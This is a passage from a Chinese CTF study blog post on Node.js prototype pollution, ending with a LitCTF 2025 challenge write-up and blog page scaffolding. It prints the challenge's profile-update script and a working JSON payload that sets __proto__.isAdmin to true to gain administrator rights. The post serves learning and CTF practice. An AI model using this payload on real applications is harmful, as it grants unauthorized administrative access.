+<p>对于<code>toLowerCase</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">字符&quot;K(开尔文符号)&quot;经过toLowerCase处理后结果为&quot;k&quot;(这个K不是K)</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="LitCTF-2025-多重宇宙日记"><a href="#LitCTF-2025-多重宇宙日记" class="headerlink" title="[LitCTF 2025]多重宇宙日记"></a>[LitCTF 2025]多重宇宙日记</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">        <span class="comment">// 更新表单的JS提交</span></span><br><span class="line">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;profileUpdateForm&#x27;</span>).<span class="title function_">addEventListener</span>(<span class="string">&#x27;submit&#x27;</span>, <span class="keyword">async</span> <span class="keyword">function</span>(<span class="params">event</span>) &#123;</span><br><span class="line">            event.<span class="title function_">preventDefault</span>();</span><br><span class="line">            <span class="keyword">const</span> statusEl = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;updateStatus&#x27;</span>);</span><br><span class="line">            <span class="keyword">const</span> currentSettingsEl = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;currentSettings&#x27;</span>);</span><br><span class="line">            statusEl.<span class="property">textContent</span> = <span class="string">&#x27;正在更新...&#x27;</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">const</span> formData = <span class="keyword">new</span> <span class="title class_">FormData</span>(event.<span class="property">target</span>);</span><br><span class="line">            <span class="keyword">const</span> settingsPayload = &#123;&#125;;</span><br><span class="line">            <span class="comment">// 构建 settings 对象，只包含有值的字段</span></span><br><span class="line">            <span class="keyword">if</span> (formData.<span class="title function_">get</span>(<span class="string">&#x27;theme&#x27;</span>)) settingsPayload.<span class="property">theme</span> = formData.<span class="title function_">get</span>(<span class="string">&#x27;theme&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span> (formData.<span class="title function_">get</span>(<span class="string">&#x27;language&#x27;</span>)) settingsPayload.<span class="property">language</span> = formData.<span class="title function_">get</span>(<span class="string">&#x27;language&#x27;</span>);</span><br><span class="line">            <span class="comment">// ...可以添加其他字段</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">const</span> response = <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">&#x27;/api/profile/update&#x27;</span>, &#123;</span><br><span class="line">                    <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">                    <span class="attr">headers</span>: &#123;</span><br><span class="line">                        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>,</span><br><span class="line">                    &#125;,</span><br><span class="line">                    <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123; <span class="attr">settings</span>: settingsPayload &#125;) <span class="comment">// 包装在 &quot;settings&quot;键下</span></span><br><span class="line">                &#125;);</span><br><span class="line">                <span class="keyword">const</span> result = <span class="keyword">await</span> response.<span class="title function_">json</span>();</span><br><span class="line">                <span class="keyword">if</span> (response.<span class="property">ok</span>) &#123;</span><br><span class="line">                    statusEl.<span class="property">textContent</span> = <span class="string">&#x27;成功: &#x27;</span> + result.<span class="property">message</span>;</span><br><span class="line">                    currentSettingsEl.<span class="property">textContent</span> = <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(result.<span class="property">settings</span>, <span class="literal">null</span>, <span class="number">2</span>);</span><br><span class="line">                    <span class="comment">// 刷新页面以更新导航栏（如果isAdmin状态改变）</span></span><br><span class="line">                    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> <span class="variable language_">window</span>.<span class="property">location</span>.<span class="title function_">reload</span>(), <span class="number">1000</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    statusEl.<span class="property">textContent</span> = <span class="string">&#x27;错误: &#x27;</span> + result.<span class="property">message</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">                statusEl.<span class="property">textContent</span> = <span class="string">&#x27;请求失败: &#x27;</span> + error.<span class="title function_">toString</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 发送原始JSON的函数</span></span><br><span class="line">        <span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">sendRawJson</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">const</span> rawJson = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;rawJsonSettings&#x27;</span>).<span class="property">value</span>;</span><br><span class="line">            <span class="keyword">const</span> statusEl = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;rawJsonStatus&#x27;</span>);</span><br><span class="line">            <span class="keyword">const</span> currentSettingsEl = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;currentSettings&#x27;</span>);</span><br><span class="line">            statusEl.<span class="property">textContent</span> = <span class="string">&#x27;正在发送...&#x27;</span>;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">const</span> parsedJson = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(rawJson); <span class="comment">// 确保是合法的JSON</span></span><br><span class="line">                <span class="keyword">const</span> response = <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">&#x27;/api/profile/update&#x27;</span>, &#123;</span><br><span class="line">                    <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">                    <span class="attr">headers</span>: &#123;</span><br><span class="line">                        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>,</span><br><span class="line">                    &#125;,</span><br><span class="line">                    <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(parsedJson) <span class="comment">// 直接发送用户输入的JSON</span></span><br><span class="line">                &#125;);</span><br><span class="line">                <span class="keyword">const</span> result = <span class="keyword">await</span> response.<span class="title function_">json</span>();</span><br><span class="line">                <span class="keyword">if</span> (response.<span class="property">ok</span>) &#123;</span><br><span class="line">                    statusEl.<span class="property">textContent</span> = <span class="string">&#x27;成功: &#x27;</span> + result.<span class="property">message</span>;</span><br><span class="line">                    currentSettingsEl.<span class="property">textContent</span> = <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(result.<span class="property">settings</span>, <span class="literal">null</span>, <span class="number">2</span>);</span><br><span class="line">                     <span class="comment">// 刷新页面以更新导航栏（如果isAdmin状态改变）</span></span><br><span class="line">                    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> <span class="variable language_">window</span>.<span class="property">location</span>.<span class="title function_">reload</span>(), <span class="number">1000</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    statusEl.<span class="property">textContent</span> = <span class="string">&#x27;错误: &#x27;</span> + result.<span class="property">message</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">                 statusEl.<span class="property">textContent</span> = <span class="string">&#x27;请求失败或JSON无效: &#x27;</span> + error.<span class="title function_">toString</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">const formData = new FormData(event.target);</span><br><span class="line">const settingsPayload = &#123;&#125;;</span><br><span class="line">// ... 提取 theme 和 language ...</span><br><span class="line"></span><br><span class="line">// 发送请求时的关键操作：</span><br><span class="line">body: JSON.stringify(&#123; settings: settingsPayload &#125;) // 包装在 &quot;settings&quot;键下,推测后端接收的是settings字段，并且提交的是原始的JSON，并没有任何过滤和限制</span><br><span class="line"></span><br><span class="line">普通用户对象在内存中缺失了 isAdmin: false 这个明确的属性，导致后端在访问isAdmin这个属性时找不到，于是从被污染的原型里找到isAdmin:true,绕过验证</span><br><span class="line"></span><br><span class="line">利用：</span><br><span class="line">利用settings将原型Object.prototype修改或者添加为 isAdmin : true</span><br><span class="line">------------------------------------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">提交JSON:</span><br><span class="line">&#123;</span><br><span class="line">    &quot;settings&quot;: &#123;</span><br><span class="line">        &quot;__proto__&quot;: &#123;</span><br><span class="line">            &quot;isAdmin&quot;: true</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+    </article>
+    
+    <div class="read-nums">
+      <!-- id 将作为查询条件 -->
+      <span id="2026/07/17/nodejs原型链污染/" class="leancloud_visitors" data-flag-title="Your Article Title">
+        <em class="post-meta-item-text">浏览量</em>
+        <i class="leancloud-visitors-count"></i>
+      </span>
+    </div>
+    <div class="comments-intro">
+      <h2>评论区</h2>
+      <p>欢迎你留下宝贵的意见，昵称输入QQ号会显示QQ头像哦~</p>
+    </div>
+    <div id="vcomments" class="vcomments"></div>
+    
+  </div>
+  <div class="article-catelogue">
+    <div class="article-catelogue--wrapper">
+      <div class="catelogue catelogue-1">
+        <h3>目录</h3>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93"><span class="toc-number">1.</span> <span class="toc-text">Nodejs原型链污染</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%B9%E8%B1%A1"><span class="toc-number">1.1.</span> <span class="toc-text">对象</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E5%9E%8B"><span class="toc-number">1.2.</span> <span class="toc-text">原型</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E5%9E%8B%E9%93%BE"><span class="toc-number">1.3.</span> <span class="toc-text">原型链</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93"><span class="toc-number">1.4.</span> <span class="toc-text">原型链污染:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#proto-%E5%92%8Cprototype"><span class="toc-number">1.5.</span> <span class="toc-text">__proto__和prototype</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B7%E4%BD%93%E8%BF%87%E7%A8%8B"><span class="toc-number">1.6.</span> <span class="toc-text">具体过程:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8B%93%E5%B1%95-js%E5%A4%A7%E5%B0%8F%E5%86%99%E7%89%B9%E6%80%A7"><span class="toc-number">1.7.</span> <span class="toc-text">拓展(js大小写特性)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#toUpperCase-%E5%92%8CtoLowerCase"><span class="toc-number">1.7.1.</span> <span class="toc-text">toUpperCase()和toLowerCase</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LitCTF-2025-%E5%A4%9A%E9%87%8D%E5%AE%87%E5%AE%99%E6%97%A5%E8%AE%B0"><span class="toc-number">1.8.</span> <span class="toc-text">[LitCTF 2025]多重宇宙日记</span></a></li></ol></li></ol>
+      </div>
+      
+        <div class="catelogue catelogue-2">
+          
+            <p>
+              <span>上一篇：</span>
+              <a href="/2026/07/17/pickle反序列化/">pickle反序列化</a>
+            </p>
+           
+          
+            <p>
+              <span>下一篇</span>
+              <a href="/2026/07/17/Linux提权/">Linux提权</a>
+            </p>
+          
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+
+<script>
+  // var定义，避免pjax重新进来造成的重复声明错误
+  var config = JSON.parse('{"enable":true,"appId":"Pf8zCXGEH1qsprnWfikVVujL-gzGzoHsz","appKey":"qOqoiUHhH1TGtLRUYURkLRQX","placeholder":"请留下你宝贵的意见吧~","meta":["nick"],"recordIP":true,"visitor":true,"enableQQ":true}')
+  new Valine({
+    el: '#vcomments',
+    appId: config.appId,
+    appKey: config.appKey,
+    placeholder: config.placeholder,
+    meta: config.meta,
+    recordIP: config.recordIP,
+    visitor: config.visitor,
+    enableQQ: config.enableQQ,
+    path: '2026/07/17/nodejs原型链污染/'
+  })
+</script>
+
+
+<script>
+  $(document).on('pjax:complete', function() {
+    const tocs = document.querySelector('.toc')
+    const links = tocs ? tocs.querySelectorAll('a') : []
+    links.forEach(link => {
+      link.addEventListener('click', e => {
+        const href = decodeURIComponent(e.href)
+        href.search(/#(.*)/)
+        const id = RegExp.$1
+        const target = document.querySelector('#' + id)
+        const top = target.offsetTop
+        document.documentElement.scrollTo({
+          top: top - 100,
+          behavior: 'smooth'
+        })
+        e.preventDefault()
+      })
+    })
+  })
+</script> 
+
+</div>
+      <div class="main-right-wrapper"><div class="main-right">
+  <div class="main-right--board">
+    <div class="main-right--title">
+      <h5>公告栏</h5>
+      <i class="iconfont icon-gonggao"></i>
+    </div>
+    <div class="main-right--content">
+      从何时开始忌讳空山无人,从何时开始怕遥望星辰 
+    </div>
+  </div>
+
+  <div id="aplayer" class="main-right--music"></div>
+
+  <div class="operate-items">
+    <div class="operate-item backtop">
+      <i class="iconfont icon-huidaodingbu"></i>
+      <span>回到顶部</span>
+    </div>
+    
+    <div class="operate-item turn-comment hidden">
+      <i class="iconfont icon-pinglun"></i>
+      <span>查看评论</span>
+    </div>
+    
+  </div>
+
+  <div class="main-right--site">
+    <div class="main-right--power">
+      <p>Power By <a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/docs/">Hexo</a>.</p>
+      <p>Theme：<a target="_blank" rel="noopener" href="https://github.com/Aizener/hexo-theme-cola">Cola.</a></p>
+    </div>
+    <p class="main-right--refer"><a target="_blank" rel="noopener" href="https://beian.miit.gov.cn/#/Integrated/index">蜀ICP备2022005384号-1</a> </p>
+  </div>
+</div>
+
+<script>
+  function setOperateItem () {
+    const reg = /\d{4}\/\d{2}\/\d{2}\/.+/
+    const path = location.pathname
+    const operateDom = document.querySelector('.main-right .operate-items')
+    const commentDom = document.querySelector('.turn-comment')
+    const cateloguDom = document.querySelector('.article-catelogue > .article-catelogue--wrapper');
+
+    if (commentDom) {
+      if (reg.test(path) || path.match(/\/log\/.+/)) {
+        commentDom.classList.remove('hidden')
+        const newDom = operateDom.cloneNode(true);
+        const _backtopDom = newDom.querySelector('.backtop');
+        const _commentDom = newDom.querySelector('.turn-comment');
+        _backtopDom.addEventListener('click', () => backTopEvent());
+        _commentDom.addEventListener('click', () => commentDomEvent());
+        cateloguDom.appendChild(newDom);
+      } else {
+        commentDom.classList.add('hidden')
+      }
+    }
+  }
+
+  setOperateItem()
+  const musics = JSON.parse(`[{"name":"任我行","artist":"eason","url":"https://y.qq.com/n/ryqq_v2/player","cover":"https://y.qq.com/n/ryqq_v2/player"}]`)
+  const ap = new APlayer({
+    container: document.querySelector('#aplayer'),
+    audio: musics,
+  })
+
+  $(document).on('pjax:complete', function() {
+    setOperateItem()
+  })
+
+  document.querySelector('.backtop').addEventListener('click', () => {
+    backTopEvent();
+  })
+  const dom = document.querySelector('.turn-comment')
+  dom && dom.addEventListener('click', () => {
+    commentDomEvent();
+  })
+
+  function backTopEvent() {
+    document.documentElement.scrollTo({
+      top: 0,
+      behavior: 'smooth'
+    })
+  }
+
+  function commentDomEvent() {
+    const commentDom = document.querySelector('.comments-intro')
+    if (!commentDom) return
+    const top = commentDom.offsetTop, height = commentDom.offsetHeight
+    document.documentElement.scrollTo({
+      top: top - 2 * height,
+      behavior: 'smooth'
+    })
+  }
+</script></div>
+    </section>
+  </div>
+  <div id="progress" class="progress"></div>
+  <div id="gray" class="gray"></div>
+
+  <script>
+    function initScroll () {
+      document.addEventListener('scroll', () => {
+        const doc = document.documentElement
+        const scrollTop = doc.scrollTop
+        const pageHeight = doc.offsetHeight
+        const clientHeight = doc.clientHeight
+        const ratio = scrollTop / (pageHeight - clientHeight)
+        const progress = document.querySelector('#progress')
+        const avatarImg = document.querySelector('.main-left--avatar')
+        progress.style.width = (100 * ratio) + '%'
+        avatarImg.style.transform = `rotate(${360 * ratio}deg)`
+      })
+    }
+
+    const rootPath = "/"
+
+    const checkAndSetArticlePageLayout = () => {
+      const path = location.pathname.replace(rootPath, '');
+      if (
+        /^\/?\d{4}\/\d{2}\/\d{2}\/.*/.test(path) ||
+        /^log\/.+/.test(path)
+      ) {
+        $('.main-container, .main-right, .main-right-wrapper').addClass('is-article')
+      } else {
+        $('.main-container, .main-right, .main-right-wrapper').removeClass('is-article')
+      }
+    }
+
+    const gray = "none"
+    const setGrayStyle = () => {
+      if (gray === 'none') {
+        return
+      } else if (gray === 'index') {
+        location.pathname === '/' ? $('#gray').show() : $('#gray').hide()
+      } else if (gray === 'all') {
+        $('#gray').show()
+      }
+    }
+    setGrayStyle()
+
+
+    window.onload = function () {
+      checkAndSetArticlePageLayout()
+      setTimeout(() => {
+        $('#load').slideUp()
+        $('#container').slideToggle()
+        setTimeout(() => {
+          initScroll();
+        }, 500)
+      }, 500)
+    }
+    
+    let status = 0
+    // 对所有链接跳转事件绑定pjax容器container
+    $(document).pjax('a[target!=_blank]', '#main-container', {
+      container: '#main-container',
+      fragment: '#main-container',
+      timeout: 8000
+    })
+
+    $(document).on('pjax:start', function() {
+    })
+    $(document).on('pjax:complete', function() {
+      status = 0
+      $('.main-container').addClass('to-up').on('animationend', function() {
+        $(this).removeClass('to-up')
+      })
+      setGrayStyle()
+      checkAndSetArticlePageLayout()
+    })
+    $(document).on('pjax:popstate', function() {
+      status = -1
+      checkAndSetArticlePageLayout()
+    });
+  </script>
+</body>
+</html>
